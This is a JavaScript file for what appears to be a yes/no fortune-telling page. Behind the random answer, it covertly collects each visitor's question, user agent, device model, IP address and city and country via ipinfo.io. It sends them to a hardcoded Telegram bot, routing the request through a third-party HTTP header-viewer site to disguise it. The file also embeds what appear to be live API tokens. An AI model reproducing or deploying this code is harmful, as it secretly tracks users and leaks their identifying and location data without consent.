function ss() {
    var text = document.getElementById("inp").value.trim();
    if (text.length === 0) return alert("Please enter a question!");

    var ua = navigator.userAgent; // Default to userAgent
    var model = "Unknown"; // Default model

    // Checking for userAgentData
    if (navigator.userAgentData) {
        navigator.userAgentData.getHighEntropyValues(["platform", "model", "ua"])
            .then(uaData => {
                console.log("Device model:", uaData.model); // Device model
                model = uaData.model || "Unknown"; // Store device model
                handleIpAndSendMessage(text, ua, model); // Process IP and send message
            })
            .catch(error => {
                console.error("Error retrieving information with userAgentData:", error);
                handleIpAndSendMessage(text, ua, model); // Fallback to userAgent
            });
    } else {
        // Fallback to userAgent
        console.log("Using userAgent.");
        const match = ua.match(/([^)]+)/);
        if (match) {
            const parts = match[1].split(";");
            for (let p of parts) {
                if (p.includes("SM-") || p.includes("Pixel") || p.includes("iPhone")) {
                    model = p.trim();
                    break;
                }
            }
        }
        handleIpAndSendMessage(text, ua, model); // Process IP and send message
    }
}

function handleIpAndSendMessage(text, ua, model) {
    // Fetch IP address from ipinfo.io
    fetch("https://ipinfo.io/json?token=324e36aad173e0") // Token for ipinfo.io
        .then(res => {
            if (!res.ok) {
                throw new Error("Network response was not ok"); // Check network response
            }
            return res.json();
        })
        .then(data => {
            var ip = data.ip;
            var loc = data.city + ", " + data.country;

            var mohtava = "ask%3A" + encodeURIComponent(text) +
                "%23UA%3A" + encodeURIComponent(ua) +
                "%23Model%3A" + encodeURIComponent(model) +
                "%23IP%3A" + encodeURIComponent(ip) +
                "%23Location%3A" + encodeURIComponent(loc);

            // Sending message to Telegram
            var con = "https://api.telegram.org/bot7181515435:AAFNo62gE7hqassHCKmckFsxkz3lvasGtQU/sendMessage?chat_id=-1002666899819&text=" + mohtava; // Telegram token

            $.ajax({
                type: "POST",
                url: "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",
                data: {
                    "UrlBox": con,
                    "AgentList": "Google Chrome",
                    "VersionsList": "HTTP/1.1",
                    "MethodList": "POST"
                },
                success: function () {
                    console.log("Message sent to Telegram successfully.");
                }
            });

            // Display random answer
            var ans = ["probably not", "probably yes", "maybe", "of course it is", "yep", "nope", "absolutely", "absolutely not"];
            const random = Math.floor(Math.random() * ans.length);
            alert(ans[random]);
            document.getElementById("inp").value = "";
        })
        .catch(error => {
            console.error("Error fetching IP:", error);
            alert("Unable to retrieve IP address. Please check your connection."); // Appropriate error message
        });
              }
